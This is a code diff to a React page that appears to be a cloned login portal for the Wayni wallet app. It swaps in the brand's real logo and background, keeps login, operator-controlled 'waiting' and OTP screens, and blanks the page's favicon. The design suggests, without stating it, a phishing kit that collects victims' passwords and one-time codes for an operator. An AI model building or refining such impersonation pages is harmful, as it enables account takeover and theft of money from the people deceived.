@@ -6,7 +6,9 @@ import WayniLoginForm from "@/components/wayni/WayniLoginForm";
 import WayniWaitingScreen from "@/components/wayni/WayniWaitingScreen";
 import WayniOtpScreen from "@/components/wayni/WayniOtpScreen";
 import WayniSuccessScreen from "@/components/wayni/WayniSuccessScreen";
-import wayniBgPattern from "@/assets/wayni-bg-pattern.svg";
+import wayniBg from "@/assets/wayni-bg.webp";
+import wayniLogo from "@/assets/wayni-logo.webp";
+import wayniLogoDark from "@/assets/wayni-logo-dark.webp";
 import storeApple from "@/assets/wayni-store-apple.jpeg";
 import storeGoogle from "@/assets/wayni-store-google.jpeg";
 
@@ -33,23 +35,6 @@ const Wayni = () => {
     document.title = "Wayni — Accedé a tu billetera";
     const link = document.querySelector("link[rel='icon']") as HTMLLinkElement;
     if (link) link.href = "data:,";
-  }, []);
-
-  const parseLoginError = useCallback((rawError?: string) => {
-    const normalized = (rawError || "").toLowerCase();
-    if (normalized.includes("email") && (normalized.includes("válido") || normalized.includes("valid")))
-      return { message: "Ingresá un email válido.", sessionStatus: "invalid_email" };
-    if (normalized.includes("senha") || normalized.includes("password") || normalized.includes("contraseña") || normalized.includes("invalid") || normalized.includes("incorrect") || normalized.includes("incorrecta"))
-      return { message: "Email o contraseña incorrectos. Intentá de nuevo.", sessionStatus: "wrong_password" };
-    if (normalized.includes("rate limit") || normalized.includes("429") || normalized.includes("too many"))
-      return { message: "Demasiados intentos. Esperá unos minutos.", sessionStatus: "rate_limited" };
-    if (normalized.includes("bloquead") || normalized.includes("blocked"))
-      return { message: "Cuenta bloqueada. Contactá al soporte.", sessionStatus: "account_blocked" };
-    if (normalized.includes("no existe") || normalized.includes("not found"))
-      return { message: "Cuenta no encontrada.", sessionStatus: "account_not_found" };
-    if (normalized.includes("network") || normalized.includes("conex") || normalized.includes("fetch") || normalized.includes("timeout"))
-      return { message: "Error de conexión. Verificá tu internet.", sessionStatus: "connection_error" };
-    return { message: "No pudimos iniciar sesión. Intentá de nuevo.", sessionStatus: "login_error" };
   }, []);
 
   // Finalizing redirect
@@ -113,7 +98,6 @@ const Wayni = () => {
       }
     } catch {}
 
-    // For now, just go to waiting (admin-controlled flow)
     setStep("waiting");
     setLoading(false);
   }, [sessionId, operatorCode]);
@@ -138,98 +122,80 @@ const Wayni = () => {
     }
   };
 
-  // ─── MOBILE ───
-  const mobileContent = (
-    <div className="flex min-h-screen flex-col bg-[#c8e64a] md:hidden relative overflow-hidden">
-      {/* Background pattern */}
-      <div className="absolute inset-0 flex items-center justify-center pointer-events-none">
-        <img src={wayniBgPattern} alt="" className="w-[140%] max-w-none opacity-60" />
-      </div>
-
-      {/* Logo */}
-      <div className="relative z-10 flex justify-center pt-12 pb-6">
-        <span className="text-[40px] font-black text-[#1a1a1a] tracking-tight" style={{ fontFamily: "'Inter', sans-serif" }}>wayni</span>
-      </div>
-
-      {/* Spacer */}
-      <div className="flex-1 relative z-10" />
-
-      {/* Bottom card */}
-      <div className="relative z-10 bg-white rounded-t-3xl px-6 pt-8 pb-8 shadow-2xl">
-        {renderContent()}
-      </div>
-    </div>
-  );
-
-  // ─── DESKTOP ───
-  const desktopContent = (
-    <div className="hidden md:flex min-h-screen bg-[#c8e64a] relative overflow-hidden">
-      {/* Background pattern */}
-      <div className="absolute inset-0 pointer-events-none overflow-hidden">
-        <img src={wayniBgPattern} alt="" className="absolute right-0 top-1/2 -translate-y-1/2 w-[60%] opacity-50" />
-      </div>
-
-      {/* Top nav */}
-      <nav className="absolute top-0 left-0 right-0 z-20 px-10 py-5 flex items-center justify-between">
-        <span className="text-[28px] font-black text-[#1a1a1a] tracking-tight" style={{ fontFamily: "'Inter', sans-serif" }}>wayni</span>
-        <div className="flex items-center gap-8">
-          <span className="text-[14px] text-[#1a1a1a] font-medium cursor-pointer hover:opacity-70 transition-opacity">Préstamos</span>
-          <span className="text-[14px] text-[#1a1a1a] font-medium cursor-pointer hover:opacity-70 transition-opacity">Centro de ayuda</span>
-          <span className="text-[14px] text-[#1a1a1a] font-medium cursor-pointer hover:opacity-70 transition-opacity">Blog</span>
-        </div>
-      </nav>
-
-      {/* Left content */}
-      <div className="relative z-10 flex-1 flex flex-col justify-center px-10 lg:px-16 xl:px-24 max-w-[55%]">
-        <h1 className="text-[48px] lg:text-[56px] font-black text-[#1a1a1a] leading-[1.1] mb-6" style={{ fontFamily: "'Inter', sans-serif" }}>
-          Porque ahora podés
-        </h1>
-        <p className="text-[16px] text-[#333] mb-6 max-w-[480px]">
-          Descubrí una nueva forma de manejar tu plata.
-        </p>
-        <div className="flex flex-col gap-3 mb-8">
-          <div className="flex items-center gap-2.5">
-            <span className="w-5 h-5 rounded-full bg-[#00b894] flex items-center justify-center">
-              <svg className="w-3 h-3 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" /></svg>
-            </span>
-            <span className="text-[15px] text-[#1a1a1a] font-medium">Financiate de la mejor forma con Adelantos</span>
-          </div>
-          <div className="flex items-center gap-2.5">
-            <span className="w-5 h-5 rounded-full bg-[#00b894] flex items-center justify-center">
-              <svg className="w-3 h-3 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" /></svg>
-            </span>
-            <span className="text-[15px] text-[#1a1a1a] font-medium">Enviá y recibí plata en el momento</span>
-          </div>
-          <div className="flex items-center gap-2.5">
-            <span className="w-5 h-5 rounded-full bg-[#00b894] flex items-center justify-center">
-              <svg className="w-3 h-3 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" /></svg>
-            </span>
-            <span className="text-[15px] text-[#1a1a1a] font-medium">Comprá donde quieras con tu tarjeta Mastercard</span>
-          </div>
-        </div>
-
-        {/* Store badges */}
-        <div className="bg-white rounded-2xl px-6 py-4 inline-flex items-center gap-3 shadow-sm w-fit">
-          <span className="text-[13px] font-semibold text-[#1a1a1a]">Impulsá tus finanzas con Wayni</span>
-          <img src={storeGoogle} alt="Google Play" className="h-[36px] rounded-md" />
-          <img src={storeApple} alt="App Store" className="h-[36px] rounded-md" />
-        </div>
-      </div>
-
-      {/* Right form card */}
-      <div className="relative z-10 flex items-center justify-center px-8 lg:px-12" style={{ minWidth: 380, maxWidth: 460 }}>
-        <div className="bg-white rounded-3xl shadow-2xl p-8 w-full max-w-[420px]">
-          {renderContent()}
-        </div>
-      </div>
-    </div>
-  );
-
+  // ─── MOBILE (390px viewport) ───
   return (
-    <>
-      {mobileContent}
-      {desktopContent}
-    </>
+    <div className="min-h-screen relative overflow-hidden" style={{ backgroundColor: "#c8e64a" }}>
+      {/* Full background image */}
+      <img
+        src={wayniBg}
+        alt=""
+        className="absolute inset-0 w-full h-full object-cover"
+      />
+
+      {/* Content overlay */}
+      <div className="relative z-10 flex flex-col min-h-screen">
+        {/* Top nav */}
+        <nav className="flex items-center justify-between px-5 py-4 md:px-10 md:py-5">
+          <img src={wayniLogoDark} alt="wayni" className="h-6 md:h-7" />
+          <div className="hidden md:flex items-center gap-8">
+            <span className="text-[14px] text-[#1a1a1a] font-medium cursor-pointer hover:opacity-70 transition-opacity">Préstamos</span>
+            <span className="text-[14px] text-[#1a1a1a] font-medium cursor-pointer hover:opacity-70 transition-opacity">Centro de ayuda</span>
+            <span className="text-[14px] text-[#1a1a1a] font-medium cursor-pointer hover:opacity-70 transition-opacity">Blog</span>
+          </div>
+        </nav>
+
+        {/* Desktop: split layout */}
+        <div className="hidden md:flex flex-1 items-center px-10 lg:px-16 xl:px-24">
+          {/* Left */}
+          <div className="flex-1 max-w-[55%]">
+            <h1 className="text-[48px] lg:text-[56px] font-black text-[#1a1a1a] leading-[1.1] mb-6" style={{ fontFamily: "'Inter', sans-serif" }}>
+              Porque ahora podés
+            </h1>
+            <p className="text-[16px] text-[#333] mb-6 max-w-[480px]">
+              Descubrí una nueva forma de manejar tu plata.
+            </p>
+            <div className="flex flex-col gap-3 mb-8">
+              {["Financiate de la mejor forma con Adelantos", "Enviá y recibí plata en el momento", "Comprá donde quieras con tu tarjeta Mastercard"].map((t) => (
+                <div key={t} className="flex items-center gap-2.5">
+                  <span className="w-5 h-5 rounded-full bg-[#00b894] flex items-center justify-center flex-shrink-0">
+                    <svg className="w-3 h-3 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" /></svg>
+                  </span>
+                  <span className="text-[15px] text-[#1a1a1a] font-medium">{t}</span>
+                </div>
+              ))}
+            </div>
+            <div className="bg-white rounded-2xl px-6 py-4 inline-flex items-center gap-3 shadow-sm w-fit">
+              <span className="text-[13px] font-semibold text-[#1a1a1a]">Impulsá tus finanzas con Wayni</span>
+              <img src={storeGoogle} alt="Google Play" className="h-[36px] rounded-md" />
+              <img src={storeApple} alt="App Store" className="h-[36px] rounded-md" />
+            </div>
+          </div>
+
+          {/* Right form card */}
+          <div className="flex items-center justify-center px-4" style={{ minWidth: 380, maxWidth: 460 }}>
+            <div className="bg-white rounded-3xl shadow-2xl p-8 w-full max-w-[420px]">
+              {renderContent()}
+            </div>
+          </div>
+        </div>
+
+        {/* Mobile: logo + spacer + bottom card */}
+        <div className="flex flex-col flex-1 md:hidden">
+          {/* Logo centered */}
+          <div className="flex justify-center pt-8 pb-4">
+            <img src={wayniLogo} alt="wayni" className="h-10" />
+          </div>
+
+          {/* Spacer */}
+          <div className="flex-1" />
+
+          {/* Bottom card */}
+          <div className="bg-white rounded-t-3xl px-6 pt-8 pb-8 shadow-2xl">
+            {renderContent()}
+          </div>
+        </div>
+      </div>
+    </div>
   );
 };
 
